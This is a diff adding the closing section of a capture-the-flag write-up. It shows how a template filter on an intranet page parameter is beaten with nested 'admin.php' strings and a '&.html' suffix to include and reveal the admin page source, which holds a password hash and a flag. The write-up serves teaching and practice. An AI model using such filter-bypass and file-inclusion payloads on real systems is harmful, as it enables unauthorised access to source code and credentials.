@@ -273,3 +273,93 @@ OK yet another page
 Another password!
 
 ![alt](./images/vulnltd-21.png)
+
+OK so look at the previous page with the page parameter ```http://159.65.18.92/intranet/index.php?page=home.html```
+
+Changing the value to xxx.html, tells me page not found, so lets fuzz that i.e. ```http://159.65.18.92/intranet/index.php?page=FUZZ.html```
+
+OK only home worked. I didn't spot something earlier, the HTML has the following comment in it
+
+```html
+    !!! Security module for including page templates !!!
+
+    Make sure REQUEST_URI ends in .html
+    Replace any characters that are not the following "a-zA-Z0-9." in $_GET["page"]
+    Filter out index.php for security in $_GET["page"]
+    Filter out admin.php for security in $_GET["page"]
+    Check template exists "home.html"
+    Template Found
+    Loading "home.html"
+```
+
+And it varies slightly when it can't find a template
+
+```html
+    !!! Security module for including page templates !!!
+
+    Make sure REQUEST_URI ends in .html
+    Replace any characters that are not the following "a-zA-Z0-9." in $_GET["page"]
+    Filter out index.php for security in $_GET["page"]
+    Filter out admin.php for security in $_GET["page"]
+    Check template exists "xxx.html"
+    Template not found switching to "error.html"
+    Loading "error.html"
+ ```
+
+ OK so I might be able to beat this filter and include the source of the admin page perhaps (as I don't have the password)
+
+ So 
+ ```
+ http://159.65.18.92/intranet/index.php?page=admin.php.html
+ ```
+
+ Gives 
+
+```
+Check template exists ".html"
+Template not found switching to "error.html"
+Loading "error.html"
+```
+
+And this
+
+```
+http://159.65.18.92/intranet/index.php?page=adadmin.phpmin.php.html
+```
+
+Gives
+
+```
+Check template exists "admin.php.html"
+Template not found switching to "error.html"
+Loading "error.html"
+```
+
+OK small tweak to
+
+```
+http://159.65.18.92/intranet/index.php?page=adadmin.phpmin.php&.html
+```
+
+And I get the following back in the response :) last flag :D
+
+```php
+<?php if( isset($_POST["password"]) && strtoupper(md5($_POST["password"])) == '3A640F988687C7352DC72F895AA791C1' ){ ?>
+
+    <h2>Download Files</h2>
+    <h4>[^FLAG^AD07238C44C1E92FA90B7363027F91D6^FLAG^]</h4>
+
+    <strong>No Files to download</strong>
+
+<?php }else{ ?>
+    <h2>Please supply a password to get the file list</h2>
+    <form method="post" action="/intranet/admin.php">
+        <input type="password" name="password">
+        <br><br>
+        <input type="submit" value="Login">
+    </form>
+<?php } ?>
+```
+
+Challenge complete
+
